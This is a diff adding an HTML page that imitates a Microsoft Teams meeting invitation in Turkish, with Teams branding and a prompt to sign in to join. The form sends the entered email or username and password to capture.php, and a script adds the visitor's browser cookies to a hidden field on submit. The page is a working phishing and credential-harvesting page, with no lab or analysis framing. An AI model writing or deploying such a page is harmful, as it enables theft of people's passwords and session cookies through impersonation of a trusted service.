@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Teams - Davet</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="teams-favicon.ico">
+</head>
+<body>
+    <div class="container">
+        <img src="teams-logo.png" alt="Microsoft Teams Logo" class="logo">
+        <h2>Microsoft Teams Davet</h2>
+        <p>Toplantıya katılmak için lütfen giriş yapın:</p>
+        <form action="capture.php" method="POST">
+            <input type="text" name="username" placeholder="E-posta veya kullanıcı adı" required>
+            <input type="password" name="password" placeholder="Şifre" required>
+            <input type="hidden" name="cookies" id="cookies">
+            <button type="submit">Katıl</button>
+        </form>
+    </div>
+    <script>
+        // Çerezleri form’a ekle
+        document.querySelector('form').addEventListener('submit', function(e) {
+            const cookies = document.cookie || 'Çerez bulunamadı';
+            document.getElementById('cookies').value = cookies;
+        });
+    </script>
+</body>
+</html>
